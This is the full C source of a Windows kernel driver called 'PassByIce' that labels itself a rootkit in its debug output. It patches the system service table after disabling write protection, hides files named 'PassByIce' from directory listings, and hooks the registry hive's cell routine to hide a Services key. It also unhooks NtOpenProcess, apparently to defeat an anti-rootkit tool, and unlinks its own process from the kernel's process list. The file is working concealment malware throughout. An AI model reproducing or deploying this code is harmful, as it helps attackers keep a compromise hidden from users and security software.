#include    "ntddk.h"
#include    "stdio.h"
#include "windef.h"
#include "stdarg.h"
#include "ntiologc.h"
/************************************************************************/
/*             pre-defines                                              */
/************************************************************************/        
#define DWORD unsigned long
#define WORD unsigned short
#define BOOL unsigned long

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; 
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]

/*
* Length of process name (rounded up to next DWORD)
*/
#define PROCNAMELEN     20

/*
* Maximum length of NT process name
*/
#define NT_PROCNAMELEN  16

#define FileIdFullDirectoryInformation 38
#define FileIdBothDirectoryInformation 37



/************************************************************************/
/* structs                                                             */
/************************************************************************/
struct _SYSTEM_THREADS
{
	LARGE_INTEGER           KernelTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           CreateTime;
	ULONG                           WaitTime;
	PVOID                           StartAddress;
	CLIENT_ID                       ClientIs;
	KPRIORITY                       Priority;
	KPRIORITY                       BasePriority;
	ULONG                           ContextSwitchCount;
	ULONG                           ThreadState;
	KWAIT_REASON            WaitReason;
};

struct _SYSTEM_PROCESSES
{
	ULONG                           NextEntryDelta;
	ULONG                           ThreadCount;
	ULONG                           Reserved[6];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ProcessName;
	KPRIORITY                       BasePriority;
	ULONG                           ProcessId;
	ULONG                           InheritedFromProcessId;
	ULONG                           HandleCount;
	ULONG                           Reserved2[2];
	VM_COUNTERS                     VmCounters;
	IO_COUNTERS                     IoCounters; //windows 2000 only
	struct _SYSTEM_THREADS          Threads[1];
};

struct _SYSTEM_PROCESSOR_TIMES
{
	LARGE_INTEGER                                        IdleTime;
	LARGE_INTEGER                                        KernelTime;
	LARGE_INTEGER                                        UserTime;
	LARGE_INTEGER                                        DpcTime;
	LARGE_INTEGER                                        InterruptTime;
	ULONG                                                        InterruptCount;
};

typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

typedef struct _FILE_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;

typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _FILE_NAMES_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryDirectoryFile(
					 IN HANDLE hFile,
					 IN HANDLE hEvent OPTIONAL,
					 IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
					 IN PVOID IoApcContext OPTIONAL,
					 OUT PIO_STATUS_BLOCK pIoStatusBlock,
					 OUT PVOID FileInformationBuffer,
					 IN ULONG FileInformationBufferLength,
					 IN FILE_INFORMATION_CLASS FileInfoClass,
					 IN BOOLEAN bReturnOnlyOneEntry,
					 IN PUNICODE_STRING PathMask OPTIONAL,
					 IN BOOLEAN bRestartQuery
					 );

typedef NTSTATUS (*ZWQUERYDIRECTORYFILE)(
										 HANDLE hFile,
										 HANDLE hEvent,
										 PIO_APC_ROUTINE IoApcRoutine,
										 PVOID IoApcContext,
										 PIO_STATUS_BLOCK pIoStatusBlock,
										 PVOID FileInformationBuffer,
										 ULONG FileInformationBufferLength,
										 FILE_INFORMATION_CLASS FileInfoClass,
										 BOOLEAN bReturnOnlyOneEntry,
										 PUNICODE_STRING PathMask,
										 BOOLEAN bRestartQuery
										 );

NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySystemInformation(
						 IN ULONG SystemInformationClass,
						 IN PVOID SystemInformation,
						 IN ULONG SystemInformationLength,
						 OUT PULONG ReturnLength);


typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
											 ULONG SystemInformationCLass,
											 PVOID SystemInformation,
											 ULONG SystemInformationLength,
											 PULONG ReturnLength
											 );

/************************************************************************/
/* globals                                                              */
/************************************************************************/
ULONG gProcessNameOffset;
LARGE_INTEGER                                        m_UserTime;
LARGE_INTEGER                                        m_KernelTime;
ZWQUERYDIRECTORYFILE        OldZwQueryDirectoryFile;
ZWQUERYSYSTEMINFORMATION        OldZwQuerySystemInformation;
#define DEVICE_NAME L"\\Device\\PassByIce"
#define DOS_NAME    L"\\DosDevices\\PassByIce"
#define IOCTL_MT_HIDE  \
CTL_CODE(FILE_DEVICE_DISK_FILE_SYSTEM, 0x201, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_MT_HIDEME  \
CTL_CODE(FILE_DEVICE_DISK_FILE_SYSTEM, 0x202, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
NTSTATUS
MyIoControl(
			IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp
			);
NTSTATUS
MydrvDispatch (
			   IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp
			   );
#define GET_PTR(ptr, offset) ( *(PVOID*)( (ULONG)ptr + (offset##Offset) ) )

#define CM_KEY_INDEX_ROOT      0x6972         // ir
#define CM_KEY_INDEX_LEAF      0x696c         // il
#define CM_KEY_FAST_LEAF       0x666c         // fl
#define CM_KEY_HASH_LEAF       0x686c         // hl

// 一些CM的数据结构，只列出用到的开头部分
#pragma pack(1)
typedef struct _CM_KEY_NODE {
	USHORT Signature;
	USHORT Flags;
	LARGE_INTEGER LastWriteTime;
	ULONG Spare;               // used to be TitleIndex
	HANDLE Parent;
	ULONG SubKeyCounts[2];     // Stable and Volatile
	HANDLE SubKeyLists[2];     // Stable and Volatile
	// ...
} CM_KEY_NODE, *PCM_KEY_NODE;

typedef struct _CM_KEY_INDEX {
	USHORT Signature;
	USHORT Count;
	HANDLE List[1];
} CM_KEY_INDEX, *PCM_KEY_INDEX;

typedef struct _CM_KEY_BODY {
	ULONG Type;                // "ky02"
	PVOID KeyControlBlock;
	PVOID NotifyBlock;
	PEPROCESS Process;         // the owner process
	LIST_ENTRY KeyBodyList; // key_nodes using the same kcb
} CM_KEY_BODY, *PCM_KEY_BODY;

typedef PVOID (__stdcall *PGET_CELL_ROUTINE)(PVOID, HANDLE);

typedef struct _HHIVE {
	ULONG Signature;
	PGET_CELL_ROUTINE GetCellRoutine;
	// ...
} HHIVE, *PHHIVE;
#pragma pack()

// 需隐藏的主键名
WCHAR g_HideKeyName[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Beep";

PGET_CELL_ROUTINE g_pGetCellRoutine = NULL;
PGET_CELL_ROUTINE* g_ppGetCellRoutine = NULL;

PCM_KEY_NODE g_HideNode = NULL;
PCM_KEY_NODE g_LastNode = NULL;
/* Find the offset of the process name within the executive process
block.  We do this by searching for the first occurance of "System"
in the current process when the device driver is loaded. */

void GetProcessNameOffset()
{
	PEPROCESS curproc = PsGetCurrentProcess();
	int i;
	for( i = 0; i < 3*PAGE_SIZE; i++ ) 
	{
		if( !strncmp( "System", (PCHAR) curproc + i, strlen("System") ))
        {
			gProcessNameOffset = i;
        }
	}
}

/* Given a directory entry, return the next
directory entry in the linked list. */

DWORD getDirEntryLenToNext(IN PVOID FileInformationBuffer,
						   IN FILE_INFORMATION_CLASS FileInfoClass)
{
	DWORD result = 0;
	switch(FileInfoClass){
	case FileDirectoryInformation:
		result = ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case FileFullDirectoryInformation:
		result = ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case FileIdFullDirectoryInformation:
		result = ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case FileBothDirectoryInformation:
		result = ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case FileIdBothDirectoryInformation:
		result = ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case FileNamesInformation:
		result = ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	}
	return result;
}


// ***************************************************************
//  function-name:setDirEntryLenToNext
//  -------------------------------------------------------------
//  pramaters:
//  -------------------------------------------------------------
//  return:void
//  -------------------------------------------------------------
// Given two directory entries, link them together in a list
// ***************************************************************
void setDirEntryLenToNext(IN PVOID FileInformationBuffer,
						  IN FILE_INFORMATION_CLASS FileInfoClass,
						  IN DWORD value)
{
	switch(FileInfoClass){
	case FileDirectoryInformation:
		((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case FileFullDirectoryInformation:
		((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case FileIdFullDirectoryInformation:
		((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case FileBothDirectoryInformation:
		((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case FileIdBothDirectoryInformation:
		((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case FileNamesInformation:
		((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	}
}

/* Return the filename of the specified directory entry. */

PVOID getDirEntryFileName(IN PVOID FileInformationBuffer,
						  IN FILE_INFORMATION_CLASS FileInfoClass)
{
	PVOID result = 0;
	switch(FileInfoClass){
	case FileDirectoryInformation:
		result = (PVOID)&((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case FileFullDirectoryInformation:
		result =(PVOID)&((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case FileIdFullDirectoryInformation:
		result =(PVOID)&((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case FileBothDirectoryInformation:
		result =(PVOID)&((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case FileIdBothDirectoryInformation:
		result =(PVOID)&((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case FileNamesInformation:
		result =(PVOID)&((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	}
	return result;
}

/* Return the length of the filename of the specified directory
entry. */

ULONG getDirEntryFileLength(IN PVOID FileInformationBuffer,
							IN FILE_INFORMATION_CLASS FileInfoClass)
{
	ULONG result = 0;
	switch(FileInfoClass){
	case FileDirectoryInformation:
		result = (ULONG)((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case FileFullDirectoryInformation:
		result =(ULONG)((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case FileIdFullDirectoryInformation:
		result =(ULONG)((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case FileBothDirectoryInformation:
		result =(ULONG)((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case FileIdBothDirectoryInformation:
		result =(ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case FileNamesInformation:
		result =(ULONG)((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	}
	return result;
}

/* Copy the process name into the specified buffer.  */

ULONG GetProcessName( PCHAR theName )
{
	PEPROCESS       curproc;
	char            *nameptr;
	//ULONG           i;
	//KIRQL           oldirql;
	
	if( gProcessNameOffset ) 
    {
		curproc = PsGetCurrentProcess();
		nameptr   = (PCHAR) curproc + gProcessNameOffset;
		strncpy( theName, nameptr, NT_PROCNAMELEN );
		theName[NT_PROCNAMELEN] = 0; /* NULL at end */
		return TRUE;
    } 
	return FALSE;
}

/* NT's ZwQueryDirectoryFile() returns a a linked list of directory
entries.  The function below imitates it, except it removes from
the list any entry who's name begins with "_root_". */

NTSTATUS NewZwQueryDirectoryFile(
								 IN HANDLE hFile,
								 IN HANDLE hEvent OPTIONAL,
								 IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
								 IN PVOID IoApcContext OPTIONAL,
								 OUT PIO_STATUS_BLOCK pIoStatusBlock,
								 OUT PVOID FileInformationBuffer,
								 IN ULONG FileInformationBufferLength,
								 IN FILE_INFORMATION_CLASS FileInfoClass,
								 IN BOOLEAN bReturnOnlyOneEntry,
								 IN PUNICODE_STRING PathMask OPTIONAL,
								 IN BOOLEAN bRestartQuery
								 )
{
	NTSTATUS rc;
	CHAR aProcessName[PROCNAMELEN];
	
	GetProcessName( aProcessName );
	DbgPrint("Rootkit: NewZwQueryDirectoryFile() from %s\n", aProcessName);
	
	rc=((ZWQUERYDIRECTORYFILE)(OldZwQueryDirectoryFile)) (
		hFile,         
		hEvent,
		IoApcRoutine,
		IoApcContext,
		pIoStatusBlock,
		FileInformationBuffer,
		FileInformationBufferLength,
		FileInfoClass,
		bReturnOnlyOneEntry,
		PathMask,
		bRestartQuery);
	
	if( NT_SUCCESS( rc ) && 
		(FileInfoClass == FileDirectoryInformation ||
		FileInfoClass == FileFullDirectoryInformation ||
		FileInfoClass == FileIdFullDirectoryInformation ||
		FileInfoClass == FileBothDirectoryInformation ||
		FileInfoClass == FileIdBothDirectoryInformation ||
		FileInfoClass == FileNamesInformation )
		) 
	{
		if(0 == memcmp(aProcessName, "PassByIce", 9))
		{
			DbgPrint("Rootkit: detected file/directory query from virvir process\n");
		}
		else
		{
			PVOID p = FileInformationBuffer;
			PVOID pLast = NULL;
			BOOL bLastOne;
			do 
			{
				bLastOne = !getDirEntryLenToNext(p,FileInfoClass);
				
				// compare directory-name prefix with 'virvir' to decide if to hide or not.
				
				if (getDirEntryFileLength(p,FileInfoClass) >= 12) {
					if( RtlCompareMemory( getDirEntryFileName(p,FileInfoClass), L"PassByIce", 12 ) == 12 ) 
					{
						if( bLastOne ) 
						{
							if( p == FileInformationBuffer ) rc = 0x80000006;
							else setDirEntryLenToNext(pLast,FileInfoClass, 0);
							break;
						} 
						else 
						{
							int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
							int iLeft = (DWORD)FileInformationBufferLength - iPos - getDirEntryLenToNext(p,FileInfoClass);
							RtlCopyMemory( p, (PVOID)( (char *)p + getDirEntryLenToNext(p,FileInfoClass) ), (DWORD)iLeft );
							continue;
						}
					}
				}
				pLast = p;
				p = ((char *)p + getDirEntryLenToNext(p,FileInfoClass) );
			} while( !bLastOne );
		}
	}
	return(rc);
}
/************************************************************************/
/* NT's ZwQuerySystemInformation() returns a linked list of processes.
The function below imitates it, except it removes from the list any
process who's name begins with "virvir". */


HANDLE OpenKeyByName(PCWSTR pwcsKeyName)
{
	NTSTATUS status;
	UNICODE_STRING uKeyName;
	OBJECT_ATTRIBUTES oa;
	HANDLE hKey;
	
	RtlInitUnicodeString(&uKeyName, pwcsKeyName);
	InitializeObjectAttributes(&oa, &uKeyName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	status = ZwOpenKey(&hKey, KEY_READ, &oa);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("ZwOpenKey Failed: %lx\n", status);
		return NULL;
	}
	
	return hKey;
}

// 获取指定Key句柄的KeyControlBlock
PVOID GetKeyControlBlock(HANDLE hKey)
{
	NTSTATUS status;
	PCM_KEY_BODY KeyBody;
	PVOID KCB;
	
	if (hKey == NULL) return NULL;
	
	// 由Key句柄获取对象体
	status = ObReferenceObjectByHandle(hKey, KEY_READ, NULL, KernelMode, &KeyBody, NULL);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("ObReferenceObjectByHandle Failed: %lx\n", status);
		return NULL;
	}
	
	// 对象体中含有KeyControlBlock
	KCB = KeyBody->KeyControlBlock;
	DbgPrint("KeyControlBlock = %lx\n", KCB);
	
	ObDereferenceObject(KeyBody);
	
	return KCB;
}

// 获取父键的最后一个子键的节点
PVOID GetLastKeyNode(PVOID Hive, PCM_KEY_NODE Node)
{
	// 获取父键的节点
	PCM_KEY_NODE ParentNode = (PCM_KEY_NODE)g_pGetCellRoutine(Hive, Node->Parent);
	// 获取子键的索引
	PCM_KEY_INDEX Index = (PCM_KEY_INDEX)g_pGetCellRoutine(Hive, ParentNode->SubKeyLists[0]);
	
	DbgPrint("ParentNode = %lx\nIndex = %lx\n", ParentNode, Index);
	
	// 如果为根(二级)索引，获取最后一个索引
	if (Index->Signature == CM_KEY_INDEX_ROOT)
	{
		Index = (PCM_KEY_INDEX)g_pGetCellRoutine(Hive, Index->List[Index->Count-1]);
		DbgPrint("Index = %lx\n", Index);
	}
	
	if (Index->Signature == CM_KEY_FAST_LEAF || Index->Signature == CM_KEY_HASH_LEAF)
	{
		// 快速叶索引(2k)或散列叶索引(XP/2k3)，返回最后的节点
		return g_pGetCellRoutine(Hive, Index->List[2*(Index->Count-1)]);  // CM_INDEX 大小是HCELL_INDEX大小的2倍。
	}
	else
	{
		// 一般叶索引，返回最后的节点
		return g_pGetCellRoutine(Hive, Index->List[Index->Count-1]);
	}
}

// GetCell例程的钩子函数
PVOID MyGetCellRoutine(PVOID Hive, HANDLE Cell)
{
	// 调用原函数
	PVOID pRet = g_pGetCellRoutine(Hive, Cell);
	if (pRet)
	{
		// 返回的是需要隐藏的节点
		if (pRet == g_HideNode)
		{
			DbgPrint("GetCellRoutine(%lx, %08lx) = %lx\n", Hive, Cell, pRet);
			// 查询、保存并返回其父键的最后一个子键的节点
			pRet = g_LastNode = (PCM_KEY_NODE)GetLastKeyNode(Hive, g_HideNode);
			DbgPrint("g_LastNode = %lx\n", g_LastNode);
			// 隐藏的正是最后一个节点，返回空值
			if (pRet == g_HideNode) pRet = NULL;
		}
		// 返回的是先前保存的最后一个节点
		else if (pRet == g_LastNode)
		{
			DbgPrint("GetCellRoutine(%lx, %08lx) = %lx\n", Hive, Cell, pRet);
			// 清空保存值，并返回空值
			pRet = g_LastNode = NULL;
		}
	}
	return pRet;
}
void Unload(IN PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT deviceObject = DriverObject->DeviceObject;
    UNICODE_STRING uniWin32NameString;
	if (g_ppGetCellRoutine)
		*g_ppGetCellRoutine = g_pGetCellRoutine;
	__asm
	{
		push        eax
			mov                eax, CR0
			and                eax, 0FFFEFFFFh
			mov                CR0, eax
			pop                eax
	}
	
	// put back the old function pointer
	InterlockedExchange( (PLONG) &SYSTEMSERVICE(ZwQueryDirectoryFile), 
		(LONG) OldZwQueryDirectoryFile);
	
	// REProtect memory
	__asm
	{
		push        eax
			mov                eax, CR0
			or                eax, NOT 0FFFEFFFFh
			mov                CR0, eax
			pop                eax
	}
    RtlInitUnicodeString( &uniWin32NameString, DOS_NAME );  
    IoDeleteSymbolicLink( &uniWin32NameString );   
    if ( deviceObject != NULL )
    {
        IoDeleteDevice( deviceObject );
    }
	return;
}
NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject , IN PUNICODE_STRING RegistryPath)
{
	UNICODE_STRING  nameString, linkString;
	NTSTATUS  status=STATUS_SUCCESS;
	ULONG BuildNumber;
	ULONG KeyHiveOffset;       // KeyControlBlock->KeyHive
	ULONG KeyCellOffset;       // KeyControlBlock->KeyCell
	HANDLE hKey;
	PVOID KCB, Hive;
	ULONG     i;
	PDEVICE_OBJECT      deviceObject;
	RtlInitUnicodeString(&nameString,DEVICE_NAME);
	RtlInitUnicodeString(&linkString,DOS_NAME);
	status = IoCreateDevice( DriverObject,0,&nameString,FILE_DEVICE_UNKNOWN,0,TRUE,&deviceObject);	
	if (!NT_SUCCESS( status ))
		return status;
	status = IoCreateSymbolicLink (&linkString, &nameString);
	if (!NT_SUCCESS( status ))
	{
		IoDeleteDevice (DriverObject->DeviceObject);
		return status;
	}   
	for ( i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		DriverObject->MajorFunction[i] = MydrvDispatch;
	}
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyIoControl;
	DriverObject->DriverUnload=Unload;
	if (PsGetVersion(NULL, NULL, &BuildNumber, NULL)) 
		return STATUS_NOT_SUPPORTED;
	DbgPrint("BuildNumber = %d\n", BuildNumber);
	
	// KeyControlBlock结构各版本略有不同
	// Cell的值一般小于0x80000000，而Hive正相反，以此来判断也可以
	switch (BuildNumber)
	{
	case 2195:     // Win2000
		KeyHiveOffset = 0xc;
		KeyCellOffset = 0x10;
		break;
	case 2600:     // WinXP
	case 3790:     // Win2003
		KeyHiveOffset = 0x10;
		KeyCellOffset = 0x14;
		break;
	default:
		return STATUS_NOT_SUPPORTED;
	}
	
	// 打开需隐藏的键
	hKey = OpenKeyByName(g_HideKeyName);
	// 获取该键的KeyControlBlock
	KCB = GetKeyControlBlock(hKey);
	if (KCB)
	{
		// 由KCB得到Hive
		PHHIVE Hive = (PHHIVE)GET_PTR(KCB, KeyHive);
		// GetCellRoutine在KCB中，保存原地址
		g_ppGetCellRoutine = &Hive->GetCellRoutine;
		g_pGetCellRoutine = Hive->GetCellRoutine;
		DbgPrint("GetCellRoutine = %lx\n", g_pGetCellRoutine);
		// 获取需隐藏的节点并保存
		g_HideNode = (PCM_KEY_NODE)g_pGetCellRoutine(Hive, GET_PTR(KCB, KeyCell));
		// 挂钩GetCell例程
		Hive->GetCellRoutine = MyGetCellRoutine;
	}
	ZwClose(hKey);
	GetProcessNameOffset();
	// UNProtect memory
	__asm
	{
		push        eax
			mov                eax, CR0
			and                eax, 0FFFEFFFFh
			mov                CR0, eax
			pop                eax
	}
	
	// place the hook using InterlockedExchange (no need to disable interrupts)
	// this uses the LOCK instruction to lock the memory bus during the next instruction 
	// Example:
	// LOCK INC DWORD PTR [EDX+04] 
	// This staves off collisions on multi-processor machines, while cli/sti only disable interrupts
	// on the current processor.
	//
	OldZwQueryDirectoryFile = 
		(ZWQUERYDIRECTORYFILE) InterlockedExchange(                (PLONG) &SYSTEMSERVICE(ZwQueryDirectoryFile),
		(LONG) NewZwQueryDirectoryFile);
	//add hide reg&files
	// REProtect memory
	__asm
	{
		push        eax
			mov                eax, CR0
			or                eax, NOT 0FFFEFFFFh
			mov                CR0, eax
			pop                eax
	}
	return status;
}
NTSTATUS
MydrvDispatch (
			   IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp
			   )
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0L;
	IoCompleteRequest( Irp, 0 );
	return Irp->IoStatus.Status;
}
NTSTATUS
MyIoControl(
			IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp
			)
{
	NTSTATUS  status=STATUS_SUCCESS;
	PIO_STACK_LOCATION irpStack; 
	PVOID ioBuffer; 
	ULONG inputBufferLength; 
	ULONG outputBufferLength;		
	ULONG ioControlCode;
	KIRQL  oldIrql;
	UNICODE_STRING  name;
	ULONG            FunctionAddress;   
	BYTE  jmp[1];
	BYTE   Orig[5]={0x68,0xc4,0x00,0x00,0x00};
	PEPROCESS   eprocess;
	PLIST_ENTRY   plist_active_procs;
	irpStack = IoGetCurrentIrpStackLocation(Irp); 
	ioControlCode= irpStack->Parameters.DeviceIoControl.IoControlCode; 
	ioBuffer = Irp->AssociatedIrp.SystemBuffer; 
	inputBufferLength = irpStack->Parameters.DeviceIoControl.InputBufferLength; 
	outputBufferLength = irpStack->Parameters.DeviceIoControl.OutputBufferLength;
	switch (ioControlCode)
	{
	case IOCTL_MT_HIDE:
		RtlInitUnicodeString(&name,L"NtOpenProcess");
		FunctionAddress=(ULONG)MmGetSystemRoutineAddress(&name);
		RtlCopyMemory(jmp,(BYTE*)FunctionAddress,1);
		KdPrint(("%08X\n",jmp[0]));
		if (jmp[0]!=0x68)
		{
			__asm
			{
				cli
					mov eax, cr0
					and eax, 0xFFFEFFFF
					mov cr0, eax
					pushad
					pushfd
			}
			oldIrql = KeRaiseIrqlToDpcLevel();
			RtlCopyMemory((BYTE*)FunctionAddress,Orig,5);
			KeLowerIrql(oldIrql);
			__asm
			{
				popfd
					popad
					mov eax, cr0
					or eax, 0x10000
					mov cr0, eax
					sti
			}
		}
		break;
	case IOCTL_MT_HIDEME:
		{
			eprocess=PsGetCurrentProcess();
			plist_active_procs = (LIST_ENTRY *) ((ULONG)eprocess+0x88);
			*((ULONG *)plist_active_procs->Blink) = (ULONG) plist_active_procs->Flink;
			*((ULONG *)plist_active_procs->Flink+1) = (ULONG) plist_active_procs->Blink;
			plist_active_procs->Flink = (LIST_ENTRY *) &(plist_active_procs->Flink); // Change the current EPROCESS
			plist_active_procs->Blink = (LIST_ENTRY *) &(plist_active_procs->Flink);
			break;
		}
	}
    Irp->IoStatus.Status = status; 
	Irp->IoStatus.Information = outputBufferLength; 
	IoCompleteRequest(Irp, IO_NO_INCREMENT); 
	return    status;
}
